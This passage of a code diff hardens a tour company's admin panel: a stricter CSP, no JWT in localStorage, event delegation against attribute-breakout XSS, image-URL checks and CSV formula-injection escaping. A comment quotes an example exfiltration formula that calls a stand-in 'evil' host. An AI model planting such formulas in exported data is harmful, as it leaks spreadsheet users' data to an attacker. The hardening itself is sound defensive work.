@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta
       http-equiv="Content-Security-Policy"
-      content="upgrade-insecure-requests"
+      content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' https: data:; connect-src 'self' https://lotus-tur-production-23c6.up.railway.app; frame-ancestors 'none'; base-uri 'self'; form-action 'none'; object-src 'none'; upgrade-insecure-requests"
     />
     <title>Лотос Тур — Админ</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -1071,6 +1071,20 @@
         <button class="ni" data-page="admins" onclick="go('admins')">
           <span class="ico">🔐</span>Администраторы
         </button>
+
+        <div class="nav-group-label">Сайт</div>
+        <button class="ni" data-page="content" onclick="go('content')">
+          <span class="ico">📄</span>Страницы и блоки
+        </button>
+        <button class="ni" data-page="banners" onclick="go('banners')">
+          <span class="ico">🖼</span>Баннеры
+        </button>
+        <button class="ni" data-page="settings" onclick="go('settings')">
+          <span class="ico">⚙️</span>Настройки сайта
+        </button>
+        <button class="ni" data-page="logs" onclick="go('logs')">
+          <span class="ico">🧾</span>Журнал действий
+        </button>
       </nav>
       <div class="sb-bot">
         <div class="admin-chip">
@@ -1462,6 +1476,237 @@
           </div>
         </div>
       </div>
+
+      <!-- CONTENT / PAGES -->
+      <div class="page" id="page-content">
+        <div class="topbar">
+          <div>
+            <h1>Страницы и блоки</h1>
+            <div class="sub">Текстовые блоки и страницы сайта</div>
+          </div>
+          <div class="topbar-actions">
+            <button class="btn btn-ghost" onclick="loadContent()">🔄</button>
+            <button class="btn btn-accent" onclick="openContentModal()">
+              + Добавить блок
+            </button>
+          </div>
+        </div>
+        <div class="card">
+          <div class="tbl-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Key</th>
+                  <th>Тип</th>
+                  <th>Заголовок</th>
+                  <th>Статус</th>
+                  <th>Обновлено</th>
+                  <th>Действия</th>
+                </tr>
+              </thead>
+              <tbody id="cBody">
+                <tr>
+                  <td colspan="6">
+                    <div class="loading-row"><div class="spin"></div></div>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <!-- BANNERS -->
+      <div class="page" id="page-banners">
+        <div class="topbar">
+          <div>
+            <h1>Баннеры</h1>
+            <div class="sub">Промо-баннеры на главной странице</div>
+          </div>
+          <div class="topbar-actions">
+            <button class="btn btn-ghost" onclick="loadBanners()">🔄</button>
+            <button class="btn btn-accent" onclick="openBannerModal()">
+              + Добавить баннер
+            </button>
+          </div>
+        </div>
+        <div class="card">
+          <div class="tbl-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Превью</th>
+                  <th>Заголовок</th>
+                  <th>Порядок</th>
+                  <th>Статус</th>
+                  <th>Действия</th>
+                </tr>
+              </thead>
+              <tbody id="bnBody">
+                <tr>
+                  <td colspan="5">
+                    <div class="loading-row"><div class="spin"></div></div>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <!-- SITE SETTINGS -->
+      <div class="page" id="page-settings">
+        <div class="topbar">
+          <div>
+            <h1>Настройки сайта</h1>
+            <div class="sub">SEO, контакты, логотип, технические работы</div>
+          </div>
+          <div class="topbar-actions">
+            <button class="btn btn-ghost" onclick="loadSettings()">🔄</button>
+          </div>
+        </div>
+        <div class="card" style="margin-bottom: 16px">
+          <div class="card-hd"><h3>SEO</h3></div>
+          <div
+            style="padding: 20px; display: grid; gap: 14px; max-width: 560px"
+          >
+            <div class="field" style="margin: 0">
+              <label>Title (до 70 симв.)</label>
+              <input type="text" id="stSeoTitle" maxlength="70" />
+            </div>
+            <div class="field" style="margin: 0">
+              <label>Meta description (до 200 симв.)</label>
+              <textarea
+                id="stSeoDescription"
+                maxlength="200"
+                style="min-height: 70px"
+              ></textarea>
+            </div>
+          </div>
+        </div>
+        <div class="card" style="margin-bottom: 16px">
+          <div class="card-hd"><h3>Контакты и логотип</h3></div>
+          <div
+            style="padding: 20px; display: grid; gap: 14px; max-width: 560px"
+          >
+            <div class="field" style="margin: 0">
+              <label>Телефон</label>
+              <input type="text" id="stPhone" placeholder="+7 900 000-00-00" />
+            </div>
+            <div class="field" style="margin: 0">
+              <label>Email</label>
+              <input
+                type="text"
+                id="stEmail"
+                placeholder="info@lotos-tour.ru"
+              />
+            </div>
+            <div class="field" style="margin: 0">
+              <label>Адрес</label>
+              <input type="text" id="stAddress" />
+            </div>
+            <div class="field" style="margin: 0">
+              <label>VK</label>
+              <input type="text" id="stVk" placeholder="https://vk.com/…" />
+            </div>
+            <div class="field" style="margin: 0">
+              <label>Telegram</label>
+              <input type="text" id="stTelegram" placeholder="https://t.me/…" />
+            </div>
+            <div class="field" style="margin: 0">
+              <label>Логотип</label>
+              <input
+                type="file"
+                id="stLogoFile"
+                accept="image/png,image/jpeg,image/webp"
+              />
+              <input type="hidden" id="stLogoUrl" />
+              <div id="stLogoPreview" style="margin-top: 8px"></div>
+            </div>
+          </div>
+        </div>
+        <div class="card" style="margin-bottom: 16px">
+          <div class="card-hd"><h3>⚠️ Технические работы</h3></div>
+          <div
+            style="padding: 20px; display: grid; gap: 14px; max-width: 560px"
+          >
+            <div
+              class="field"
+              style="margin: 0; display: flex; align-items: center; gap: 8px"
+            >
+              <input type="checkbox" id="stMaintenance" style="width: auto" />
+              <label style="margin: 0; text-transform: none; font-size: 0.85rem"
+                >Включить технические работы (сайт станет недоступен для
+                посетителей)</label
+              >
+            </div>
+            <div class="field" style="margin: 0">
+              <label>Сообщение для посетителей</label>
+              <textarea
+                id="stMaintenanceMessage"
+                style="min-height: 70px"
+              ></textarea>
+            </div>
+          </div>
+        </div>
+        <button class="btn btn-accent" id="stSaveBtn" onclick="saveSettings()">
+          Сохранить настройки
+        </button>
+      </div>
+
+      <!-- AUDIT LOGS -->
+      <div class="page" id="page-logs">
+        <div class="topbar">
+          <div>
+            <h1>Журнал действий</h1>
+            <div class="sub">Кто, когда и что изменил в админ-панели</div>
+          </div>
+          <div class="topbar-actions">
+            <button class="btn btn-ghost" onclick="loadLogs()">🔄</button>
+          </div>
+        </div>
+        <div class="card">
+          <div class="toolbar">
+            <input
+              class="search-input"
+              id="lgAdmin"
+              placeholder="Фильтр по администратору…"
+              oninput="debouncedFilterLogs()"
+            />
+            <select class="filter-select" id="lgAction" onchange="loadLogs()">
+              <option value="">Все действия</option>
+              <option value="tour.">Туры</option>
+              <option value="user.">Пользователи</option>
+              <option value="booking.">Бронирования</option>
+              <option value="content.">Контент</option>
+              <option value="banner.">Баннеры</option>
+              <option value="settings.">Настройки</option>
+              <option value="media.">Медиа</option>
+            </select>
+          </div>
+          <div class="tbl-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>Когда</th>
+                  <th>Администратор</th>
+                  <th>Действие</th>
+                  <th>Объект</th>
+                  <th>Детали</th>
+                  <th>IP</th>
+                </tr>
+              </thead>
+              <tbody id="lgBody">
+                <tr>
+                  <td colspan="6">
+                    <div class="loading-row"><div class="spin"></div></div>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
     </main>
 
     <!-- MODAL: edit booking status -->
@@ -1575,6 +1820,164 @@
       </div>
     </div>
 
+    <!-- MODAL: reset password -->
+    <div class="modal-bg" id="mResetPwd">
+      <div class="modal-box">
+        <div class="modal-head">
+          <h3>Сбросить пароль</h3>
+          <button class="modal-close" onclick="closeMResetPwd()">✕</button>
+        </div>
+        <div class="modal-body">
+          <p
+            style="color: var(--muted); font-size: 0.82rem; margin-bottom: 14px"
+          >
+            Новый пароль для
+            <b id="mResetPwdUsername" style="color: var(--text)"></b>. Сообщите
+            его пользователю напрямую — он не сохраняется в журнале действий.
+          </p>
+          <div class="field">
+            <label>Новый пароль</label>
+            <input
+              type="text"
+              id="rpNewPassword"
+              placeholder="Минимум 8 символов, 1 заглавная, 1 цифра"
+            />
+          </div>
+          <div class="auth-err" id="rpErr"></div>
+        </div>
+        <div class="modal-foot">
+          <button class="btn btn-ghost" onclick="closeMResetPwd()">
+            Отмена
+          </button>
+          <button class="btn btn-accent" onclick="submitResetPassword()">
+            Сохранить
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- MODAL: content block / page -->
+    <div class="modal-bg" id="mContent">
+      <div class="modal-box">
+        <div class="modal-head">
+          <h3 id="mContentTitle">Добавить блок</h3>
+          <button class="modal-close" onclick="closeMContent()">✕</button>
+        </div>
+        <div class="modal-body">
+          <div class="field">
+            <label>Key (slug) *</label>
+            <input
+              type="text"
+              id="cKey"
+              placeholder="about_page, footer_note…"
+            />
+          </div>
+          <div class="field">
+            <label>Тип</label>
+            <select id="cType">
+              <option value="block">Текстовый блок</option>
+              <option value="page">Страница</option>
+            </select>
+          </div>
+          <div class="field">
+            <label>Заголовок *</label>
+            <input type="text" id="cTitle" placeholder="О компании" />
+          </div>
+          <div class="field">
+            <label>Содержимое</label>
+            <textarea
+              id="cBodyInput"
+              style="min-height: 160px"
+              placeholder="Текст блока/страницы…"
+            ></textarea>
+          </div>
+          <div
+            class="field"
+            style="display: flex; align-items: center; gap: 8px"
+          >
+            <input
+              type="checkbox"
+              id="cPublished"
+              style="width: auto"
+              checked
+            />
+            <label style="margin: 0; text-transform: none; font-size: 0.85rem"
+              >Опубликовано</label
+            >
+          </div>
+        </div>
+        <div class="modal-foot">
+          <button class="btn btn-ghost" onclick="closeMContent()">
+            Отмена
+          </button>
+          <button class="btn btn-accent" id="cSaveBtn" onclick="saveContent()">
+            Сохранить
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- MODAL: banner -->
+    <div class="modal-bg" id="mBanner">
+      <div class="modal-box">
+        <div class="modal-head">
+          <h3 id="mBannerTitle">Добавить баннер</h3>
+          <button class="modal-close" onclick="closeMBanner()">✕</button>
+        </div>
+        <div class="modal-body">
+          <div class="field">
+            <label>Заголовок *</label>
+            <input type="text" id="bnTitle" placeholder="Летняя акция" />
+          </div>
+          <div class="field">
+            <label>Подзаголовок</label>
+            <input
+              type="text"
+              id="bnSubtitle"
+              placeholder="Скидка 20% до конца месяца"
+            />
+          </div>
+          <div class="field">
+            <label>Изображение *</label>
+            <input
+              type="file"
+              id="bnImageFile"
+              accept="image/png,image/jpeg,image/gif,image/webp"
+            />
+            <input type="hidden" id="bnImageUrl" />
+            <div id="bnImgPreview" style="margin-top: 8px"></div>
+          </div>
+          <div class="field">
+            <label>Ссылка при клике</label>
+            <input
+              type="text"
+              id="bnLinkUrl"
+              placeholder="https://lotos-tour.ru/tours/askold"
+            />
+          </div>
+          <div class="field">
+            <label>Порядок сортировки</label>
+            <input type="number" id="bnSortOrder" value="0" min="0" />
+          </div>
+          <div
+            class="field"
+            style="display: flex; align-items: center; gap: 8px"
+          >
+            <input type="checkbox" id="bnActive" style="width: auto" checked />
+            <label style="margin: 0; text-transform: none; font-size: 0.85rem"
+              >Активен</label
+            >
+          </div>
+        </div>
+        <div class="modal-foot">
+          <button class="btn btn-ghost" onclick="closeMBanner()">Отмена</button>
+          <button class="btn btn-accent" id="bnSaveBtn" onclick="saveBanner()">
+            Сохранить
+          </button>
+        </div>
+      </div>
+    </div>
+
     <div id="toast"></div>
 
     <script>
@@ -1597,16 +2000,21 @@
       }
 
       async function api(path, opts = {}) {
+        // SECURITY FIX: no longer reads/sends a token from localStorage.
+        // The backend already accepts the httpOnly `access_token` cookie
+        // (see app/core/deps.py — it falls back to the cookie when no
+        // Bearer header is present), which JS can never read even if an
+        // XSS bug slips into this page. Keeping a copy of the JWT in
+        // localStorage gave any future XSS a way to steal a portable,
+        // long-lived credential; removing it doesn't change how the app
+        // behaves for a legitimate logged-in admin at all.
         const csrfToken = getCookie("csrf_token");
-        const token = localStorage.getItem("access_token");
-        // Guard: always use https to prevent Mixed Content errors
         const base = API.replace(/^http:\/\//, "https://");
         const r = await fetch(base + path, {
           ...opts,
           credentials: "include",
           headers: {
             "Content-Type": "application/json",
-            ...(token ? { Authorization: `Bearer ${token}` } : {}),
             ...(csrfToken ? { "X-CSRF-Token": csrfToken } : {}),
             ...opts.headers,
           },
@@ -1616,6 +2024,24 @@
           throw new Error(e.detail || "Ошибка " + r.status);
         }
         return r.status === 204 ? null : r.json();
+      }
+
+      // Like api(), but for multipart/form-data uploads — must NOT set
+      // Content-Type manually (the browser sets the multipart boundary).
+      async function apiUpload(path, formData) {
+        const csrfToken = getCookie("csrf_token");
+        const base = API.replace(/^http:\/\//, "https://");
+        const r = await fetch(base + path, {
+          method: "POST",
+          credentials: "include",
+          headers: csrfToken ? { "X-CSRF-Token": csrfToken } : {},
+          body: formData,
+        });
+        if (!r.ok) {
+          const e = await r.json().catch(() => ({}));
+          throw new Error(e.detail || "Ошибка " + r.status);
+        }
+        return r.json();
       }
 
       function toast(msg, type = "ok") {
@@ -1685,17 +2111,14 @@
         $("aBtn").disabled = true;
         $("aBtn").textContent = "Входим…";
         try {
-          const loginData = await api("/api/auth/login", {
+          await api("/api/auth/login", {
             method: "POST",
             body: JSON.stringify({ username: u, password: p }),
           });
-          if (loginData && loginData.access_token)
-            localStorage.setItem("access_token", loginData.access_token);
           try {
             await api("/api/admin/stats");
           } catch {
             await api("/api/auth/logout", { method: "POST" }).catch(() => {});
-            localStorage.removeItem("access_token");
             throw new Error("Нет прав администратора.");
           }
           const me = await api("/api/auth/me");
@@ -1719,7 +2142,6 @@
 
       async function adminLogout() {
         await api("/api/auth/logout", { method: "POST" }).catch(() => {});
-        localStorage.removeItem("access_token");
         CU = null;
         $("authOverlay").style.display = "flex";
       }
@@ -1743,6 +2165,10 @@
           users: loadUsers,
           admins: loadAdmins,
           schedule: buildScheduleAdmin,
+          content: loadContent,
+          banners: loadBanners,
+          settings: loadSettings,
+          logs: loadLogs,
         };
         if (loaders[name]) loaders[name]();
       }
@@ -2008,7 +2434,7 @@
           <div class="tour-nm">${escHtml(t.name)}${t.schedule === "Ежедневно" ? ' <span style="opacity:.5;font-size:.6rem">(ежедн.)</span>' : ""}</div>
           <div class="tour-t">${escHtml(t.departure || t.time || "")} · от ${escHtml(String(t.price))}₽</div>
           <div class="wday-tour-actions">
-            <select class="sched-day-select" data-tour-id="${t.id}" onchange="changeTourDay(this)">
+            <select class="sched-day-select" data-tour-id="${escHtml(t.id)}" onchange="changeTourDay(this)">
               ${allDayNames.map((d) => `<option value="${d}" ${t.schedule === d ? "selected" : ""}>${d}</option>`).join("")}
               <option value="Ежедневно" ${t.schedule === "Ежедневно" ? "selected" : ""}>Ежедневно</option>
               <option value="По запросу" ${t.schedule === "По запросу" ? "selected" : ""}>По запросу</option>
@@ -2210,12 +2636,24 @@
       }
 
       function downloadCSV(filename, rows) {
+        // SECURITY FIX (CSV/formula injection): a booking made with a
+        // name like `=HYPERLINK("http://evil/?"&A1)` would previously be
+        // exported byte-for-byte and could execute as a formula the
+        // moment an admin opened the file in Excel/Sheets. Prefixing a
+        // leading tab before =, +, -, @ (and CR/LF, which Excel also
+        // treats as a new-formula start in some versions) forces the
+        // cell to be read as plain text instead.
+        const csvSafe = (v) => {
+          let s = v == null ? "" : String(v);
+          if (/^[=+\-@\t\r]/.test(s)) s = "\t" + s;
+          return s;
+        };
         const bom = "\uFEFF";
         const content =
           bom +
           rows
             .map((r) =>
-              r.map((v) => `"${String(v).replace(/"/g, '""')}"`).join(","),
+              r.map((v) => `"${csvSafe(v).replace(/"/g, '""')}"`).join(","),
             )
             .join("\n");
         const a = document.createElement("a");
@@ -2230,7 +2668,6 @@
           '<tr><td colspan="6"><div class="loading-row"><div class="spin"></div></div></td></tr>';
         try {
           allTours = await api("/api/admin/tours");
-          // BUG FIX: Tour model has no 'schedule' field — removed that column from table
           $("tBody").innerHTML = allTours.length
             ? allTours
                 .map(
@@ -2242,8 +2679,8 @@
         <td style="font-weight:700;color:var(--accent)">${(t.price || 0).toLocaleString("ru-RU")} ₽</td>
         <td style="text-align:center;font-weight:700">${t.bookings_count || 0}</td>
         <td style="white-space:nowrap">
-          <button class="btn btn-ghost" style="font-size:.72rem;padding:5px 10px" onclick='openTourModal("${escHtml(t.id)}", ${JSON.stringify(t).replace(/'/g, "\\'")})'>✏ Ред.</button>
-          <button class="btn btn-danger" style="font-size:.72rem;padding:5px 10px;margin-left:5px" onclick="deleteTour('${escHtml(t.id)}','${t.name.replace(/'/g, "\\'")}')">🗑</button>
+          <button class="btn btn-ghost" data-action="edit-tour" data-tour-id="${escHtml(t.id)}" style="font-size:.72rem;padding:5px 10px">✏ Ред.</button>
+          <button class="btn btn-danger" data-action="delete-tour" data-tour-id="${escHtml(t.id)}" style="font-size:.72rem;padding:5px 10px;margin-left:5px">🗑</button>
         </td>
       </tr>`,
                 )
@@ -2254,6 +2691,27 @@
             `<tr><td colspan="6"><div class="empty"><span class="ico">⚠️</span>${escHtml(e.message)}</div></td></tr>`;
         }
       }
+
+      // SECURITY FIX: event delegation instead of inline onclick="" with
+      // hand-serialized JS/JSON embedded in the HTML attribute. The old
+      // code did `onclick='openTourModal("${id}", ${JSON.stringify(t)
+      // .replace(/'/g,"\\'")})'` — replacing a quote with a backslash
+      // does nothing in HTML attribute parsing (backslash has no special
+      // meaning there), so a tour name/id containing a single quote
+      // could break out of the attribute and inject arbitrary JS. Here
+      // we only ever put a single escHtml()-escaped id into a data-*
+      // attribute and look the full object up from the in-memory
+      // `allTours` array — there is no string-to-be-parsed-as-code step
+      // at all, so there's nothing for a quote character to break out of.
+      $("tBody").addEventListener("click", (e) => {
+        const btn = e.target.closest("[data-action]");
+        if (!btn) return;
+        const tour = allTours.find((t) => String(t.id) === btn.dataset.tourId);
+        if (!tour) return;
+        if (btn.dataset.action === "edit-tour") openTourModal(tour.id, tour);
+        else if (btn.dataset.action === "delete-tour")
+          deleteTour(tour.id, tour.name);
+      });
 
       let adminBookedDates = new Set();
       let adminCalYear = new Date().getFullYear();
@@ -2359,10 +2817,13 @@
         );
         adminCalYear = new Date().getFullYear();
         adminCalMonth = new Date().getMonth();
-        // Show image preview
+        // Show image preview. escHtml() neutralises a stray `"` so a
+        // crafted img_url can't break out of the src="" attribute; the
+        // http(s)-only check stops a javascript:/data: URL from ever
+        // reaching the DOM in the first place.
         const prev = $("tImgPreview");
-        prev.innerHTML = data?.img_url
-          ? `<img src="${data.img_url}" alt="preview" style="max-width:100%;max-height:120px;border-radius:8px;object-fit:cover" onerror="this.remove()">`
+        prev.innerHTML = isSafeImageUrl(data?.img_url)
+          ? `<img src="${escHtml(data.img_url)}" alt="preview" style="max-width:100%;max-height:120px;border-radius:8px;object-fit:cover" onerror="this.remove()">`
           : "";
         $("mTour").classList.add("open");
         setTimeout(() => buildAdminCalendar(), 50);
@@ -2370,8 +2831,8 @@
       // Live image preview
       $("tImg").addEventListener("input", function () {
         const prev = $("tImgPreview");
-        prev.innerHTML = this.value
-          ? `<img src="${this.value}" alt="preview" style="max-width:100%;max-height:120px;border-radius:8px;object-fit:cover;margin-top:8px" onerror="this.remove()">`
+        prev.innerHTML = isSafeImageUrl(this.value)
+          ? `<img src="${escHtml(this.value)}" alt="preview" style="max-width:100%;max-height:120px;border-radius:8px;object-fit:cover;margin-top:8px" onerror="this.remove()">`
           : "";
       });
       function closeMT() {
@@ -2478,6 +2939,12 @@
         renderUsers(list);
       }
 
+      const ROLE_LABELS = {
+        user: "Пользователь",
+        moderator: "Модератор",
+        admin: "Админ",
+      };
+
       function renderUsers(list) {
         $("uBody").innerHTML = list.length
           ? list
@@ -2493,11 +2960,20 @@
       <td class="td-m">${fmt(u.created_at)}</td>
       <td style="text-align:center;font-weight:700">${u.bookings_count || 0}</td>
       <td>${u.is_active ? '<span class="badge badge-completed">Активен</span>' : '<span class="badge badge-cancelled">Заблокирован</span>'}</td>
-      <td>${u.is_admin ? '<span class="badge badge-admin">Админ</span>' : '<span class="badge badge-user">Польз.</span>'}</td>
+      <td>
+        <select class="role-select" data-user-id="${u.id}" onchange="updateUserRole(${u.id}, this.value)" ${u.id === CU?.id ? "disabled title='Нельзя изменить свою роль'" : ""}>
+          ${Object.entries(ROLE_LABELS)
+            .map(
+              ([val, label]) =>
+                `<option value="${val}" ${(u.role || (u.is_admin ? "admin" : "user")) === val ? "selected" : ""}>${label}</option>`,
+            )
+            .join("")}
+        </select>
+      </td>
       <td style="white-space:nowrap">
         <button class="btn btn-ghost" style="font-size:.68rem;padding:4px 8px" onclick="openMU(${u.id})">👁</button>
         <button class="btn ${u.is_active ? "btn-danger" : "btn-success"}" style="font-size:.68rem;padding:4px 8px;margin-left:3px" onclick="toggleActive(${u.id},${!u.is_active})">${u.is_active ? "Блок." : "Разблок."}</button>
-        <button class="btn btn-ghost" style="font-size:.68rem;padding:4px 8px;margin-left:3px" onclick="toggleAdmin(${u.id},${!u.is_admin})" ${u.id === CU?.id ? "disabled title='Нельзя изменить себя'" : ""}>${u.is_admin ? "Снять" : "+Адм"}</button>
+        ${!u.is_oauth ? `<button class="btn btn-ghost" style="font-size:.68rem;padding:4px 8px;margin-left:3px" onclick="openResetPasswordModal(${u.id})">🔑</button>` : ""}
       </td>
     </tr>`,
               )
@@ -2505,10 +2981,60 @@
           : '<tr><td colspan="8"><div class="empty"><span class="ico">👤</span>Не найдено</div></td></tr>';
       }
 
+      async function updateUserRole(id, role) {
+        try {
+          await api(`/api/admin/users/${id}/role`, {
+            method: "PATCH",
+            body: JSON.stringify({ role }),
+          });
+          toast(`Роль изменена: ${ROLE_LABELS[role] || role}`);
+          loadUsers();
+          if ($("page-admins").classList.contains("active")) loadAdmins();
+        } catch (e) {
+          toast(e.message, "err");
+          loadUsers(); // revert the <select> to the real server state
+        }
+      }
+
+      function openResetPasswordModal(id) {
+        const u = allUsers.find((u) => u.id === id);
+        if (!u) return;
+        $("mResetPwd").dataset.userId = id;
+        $("mResetPwdUsername").textContent = u.username;
+        $("rpNewPassword").value = "";
+        $("rpErr").textContent = "";
+        $("mResetPwd").classList.add("open");
+      }
+      function closeMResetPwd() {
+        $("mResetPwd").classList.remove("open");
+      }
+      async function submitResetPassword() {
+        const id = $("mResetPwd").dataset.userId;
+        const newPassword = $("rpNewPassword").value;
+        $("rpErr").textContent = "";
+        try {
+          const res = await api(`/api/admin/users/${id}/reset-password`, {
+            method: "POST",
+            body: JSON.stringify({ new_password: newPassword }),
+          });
+          toast(res.detail || "Пароль обновлён");
+          closeMResetPwd();
+        } catch (e) {
+          $("rpErr").textContent = e.message;
+        }
+      }
+
       // User detail modal
       function openMU(id) {
         const u = allUsers.find((u) => u.id === id);
         if (!u) return;
+        const role = u.role || (u.is_admin ? "admin" : "user");
+        const roleBadgeClass =
+          role === "admin"
+            ? "badge-admin"
+            : role === "moderator"
+              ? "badge-oauth"
+              : "badge-user";
         $("mUBody").innerHTML = `
     <div style="display:flex;align-items:center;gap:14px;margin-bottom:20px">
       <div class="user-detail-av">${u.username[0].toUpperCase()}</div>
@@ -2516,7 +3042,7 @@
         <div style="font-weight:800;font-size:1rem">${escHtml(u.username)}</div>
         <div style="color:var(--muted);font-size:.82rem">${escHtml(u.email)}</div>
         <div style="margin-top:5px;display:flex;gap:6px">
-          ${u.is_admin ? '<span class="badge badge-admin">Администратор</span>' : '<span class="badge badge-user">Пользователь</span>'}
+          <span class="badge ${roleBadgeClass}">${escHtml(ROLE_LABELS[role] || role)}</span>
           ${u.is_active ? '<span class="badge badge-completed">Активен</span>' : '<span class="badge badge-cancelled">Заблокирован</span>'}
           ${u.is_oauth ? '<span class="badge badge-oauth">OAuth</span>' : ""}
         </div>
@@ -2529,9 +3055,9 @@
       <div class="detail-row"><span class="detail-label">Зарегистрирован</span><span class="detail-value">${fmtFull(u.created_at)}</span></div>
       <div class="detail-row"><span class="detail-label">Бронирований</span><span class="detail-value" style="font-weight:800;color:var(--accent)">${u.bookings_count || 0}</span></div>
     </div>
-    <div style="display:flex;gap:8px;margin-top:16px">
+    <div style="display:flex;gap:8px;margin-top:16px;flex-wrap:wrap">
       <button class="btn ${u.is_active ? "btn-danger" : "btn-success"}" onclick="toggleActive(${u.id},${!u.is_active});closeMU()">${u.is_active ? "Заблокировать" : "Разблокировать"}</button>
-      ${u.id !== CU?.id ? `<button class="btn btn-ghost" onclick="toggleAdmin(${u.id},${!u.is_admin});closeMU()">${u.is_admin ? "Снять права адм." : "Дать права адм."}</button>` : ""}
+      ${!u.is_oauth ? `<button class="btn btn-ghost" onclick="closeMU();openResetPasswordModal(${u.id})">Сбросить пароль</button>` : ""}
     </div>`;
         $("mUser").classList.add("open");
       }
@@ -2646,6 +3172,365 @@
         }
       }
 
+      // ── CONTENT / PAGES ──
+      let allContent = [];
+      let editContentKey = null;
+
+      async function loadContent() {
+        $("cBody").innerHTML =
+          '<tr><td colspan="6"><div class="loading-row"><div class="spin"></div></div></td></tr>';
+        try {
+          allContent = await api("/api/admin/content");
+          $("cBody").innerHTML = allContent.length
+            ? allContent
+                .map(
+                  (c) => `
+      <tr>
+        <td class="td-m" style="font-family:monospace">${escHtml(c.key)}</td>
+        <td><span class="badge badge-booked">${c.block_type === "page" ? "Страница" : "Блок"}</span></td>
+        <td style="font-weight:600">${escHtml(c.title)}</td>
+        <td>${c.is_published ? '<span class="badge badge-completed">Опубликован</span>' : '<span class="badge badge-cancelled">Черновик</span>'}</td>
+        <td class="td-m">${fmt(c.updated_at)}</td>
+        <td style="white-space:nowrap">
+          <button class="btn btn-ghost" data-action="edit-content" data-key="${escHtml(c.key)}" style="font-size:.72rem;padding:5px 10px">✏ Ред.</button>
+          <button class="btn btn-danger" data-action="delete-content" data-key="${escHtml(c.key)}" style="font-size:.72rem;padding:5px 10px;margin-left:5px">🗑</button>
+        </td>
+      </tr>`,
+                )
+                .join("")
+            : '<tr><td colspan="6"><div class="empty"><span class="ico">📄</span>Нет блоков — добавьте первый</div></td></tr>';
+        } catch (e) {
+          $("cBody").innerHTML =
+            `<tr><td colspan="6"><div class="empty"><span class="ico">⚠️</span>${escHtml(e.message)}</div></td></tr>`;
+        }
+      }
+
+      // Event delegation (see the matching comment on #tBody above) —
+      // same reasoning applies here: never serialize content into an
+      // inline onclick string, always look the object up by a plain,
+      // escaped key from the in-memory `allContent` array.
+      $("cBody").addEventListener("click", (e) => {
+        const btn = e.target.closest("[data-action]");
+        if (!btn) return;
+        const block = allContent.find((c) => c.key === btn.dataset.key);
+        if (!block) return;
+        if (btn.dataset.action === "edit-content") openContentModal(block);
+        else if (btn.dataset.action === "delete-content")
+          deleteContent(block.key, block.title);
+      });
+
+      function openContentModal(block = null) {
+        editContentKey = block ? block.key : null;
+        $("mContentTitle").textContent = block
+          ? "Редактировать блок"
+          : "Добавить блок";
+        $("cKey").value = block?.key || "";
+        $("cKey").readOnly = !!block;
+        $("cType").value = block?.block_type || "block";
+        $("cTitle").value = block?.title || "";
+        $("cBodyInput").value = block?.body || "";
+        $("cPublished").checked = block ? block.is_published : true;
+        $("mContent").classList.add("open");
+      }
+      function closeMContent() {
+        $("mContent").classList.remove("open");
+        editContentKey = null;
+      }
+
+      async function saveContent() {
+        $("cSaveBtn").disabled = true;
+        try {
+          const payload = {
+            title: $("cTitle").value.trim(),
+            body: $("cBodyInput").value,
+            is_published: $("cPublished").checked,
+          };
+          if (!payload.title) {
+            toast("Введите заголовок", "err");
+            return;
+          }
+          if (editContentKey) {
+            await api(
+              `/api/admin/content/${encodeURIComponent(editContentKey)}`,
+              {
+                method: "PATCH",
+                body: JSON.stringify(payload),
+              },
+            );
+            toast("Блок обновлён");
+          } else {
+            const key = $("cKey").value.trim();
+            if (!key) {
+              toast("Введите key", "err");
+              return;
+            }
+            await api("/api/admin/content", {
+              method: "POST",
+              body: JSON.stringify({
+                key,
+                block_type: $("cType").value,
+                ...payload,
+              }),
+            });
+            toast("Блок добавлен");
+          }
+          closeMContent();
+          loadContent();
+        } catch (e) {
+          toast(e.message, "err");
+        } finally {
+          $("cSaveBtn").disabled = false;
+        }
+      }
+
+      async function deleteContent(key, title) {
+        if (!confirm(`Удалить блок «${title}»? Это действие нельзя отменить.`))
+          return;
+        try {
+          await api(`/api/admin/content/${encodeURIComponent(key)}`, {
+            method: "DELETE",
+          });
+          toast("Блок удалён");
+          loadContent();
+        } catch (e) {
+          toast(e.message, "err");
+        }
+      }
+
+      // ── BANNERS ──
+      let allBanners = [];
+      let editBannerId = null;
+
+      async function loadBanners() {
+        $("bnBody").innerHTML =
+          '<tr><td colspan="5"><div class="loading-row"><div class="spin"></div></div></td></tr>';
+        try {
+          allBanners = await api("/api/admin/banners");
+          $("bnBody").innerHTML = allBanners.length
+            ? allBanners
+                .map(
+                  (b) => `
+      <tr>
+        <td>${isSafeImageUrl(b.image_url) ? `<img src="${escHtml(b.image_url)}" style="width:64px;height:40px;object-fit:cover;border-radius:6px" onerror="this.remove()">` : "—"}</td>
+        <td style="font-weight:600">${escHtml(b.title)}</td>
+        <td class="td-m">${b.sort_order}</td>
+        <td>${b.is_active ? '<span class="badge badge-completed">Активен</span>' : '<span class="badge badge-cancelled">Выключен</span>'}</td>
+        <td style="white-space:nowrap">
+          <button class="btn btn-ghost" data-action="edit-banner" data-id="${b.id}" style="font-size:.72rem;padding:5px 10px">✏ Ред.</button>
+          <button class="btn btn-danger" data-action="delete-banner" data-id="${b.id}" style="font-size:.72rem;padding:5px 10px;margin-left:5px">🗑</button>
+        </td>
+      </tr>`,
+                )
+                .join("")
+            : '<tr><td colspan="5"><div class="empty"><span class="ico">🖼</span>Нет баннеров</div></td></tr>';
+        } catch (e) {
+          $("bnBody").innerHTML =
+            `<tr><td colspan="5"><div class="empty"><span class="ico">⚠️</span>${escHtml(e.message)}</div></td></tr>`;
+        }
+      }
+
+      $("bnBody").addEventListener("click", (e) => {
